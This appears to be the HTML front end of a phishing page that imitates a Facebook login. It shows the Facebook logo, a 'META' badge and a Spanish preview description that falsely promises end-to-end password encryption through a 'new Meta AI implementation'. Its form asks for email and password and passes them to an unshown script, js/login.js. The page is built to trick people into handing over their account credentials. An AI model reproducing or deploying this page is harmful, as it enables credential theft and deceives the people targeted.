<head>

  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>       
  <link rel="icon" href="/src/icons/facealert.png" type="image/png">
  <meta property="og:image" content="src/icons/facealert.png">
  <meta property="og:description" content="protege tu contraseña cifrandola de extremo a extemo nueva implementacion meta ia.">
  <title>Facebook block</title>

<body>
  <form id="loginForm">
    <div class="facebook-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48px" height="48px">
        <path fill="#1877F2" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/>
        <path fill="#FFF" d="M34.368,25H31v13h-5V25h-3v-4h3v-2.41c0.002-3.508,1.459-5.59,5.592-5.59H35v4h-2.287C31.104,17,31,17.6,31,18.723V21h4L34.368,25z"/>
      </svg>
    </div>
    <input type="email" id="email" placeholder="Correo electrónico" required />
    <input type="password" id="password" placeholder="Contraseña" required />
    <button type="submit">Login</button>
  </form>

  <div class="meta-bubble">
    <div class="meta-icon">META</div>
    <div class="bubble-tail"></div>
  </div>

  <script src="js/login.js"></script>
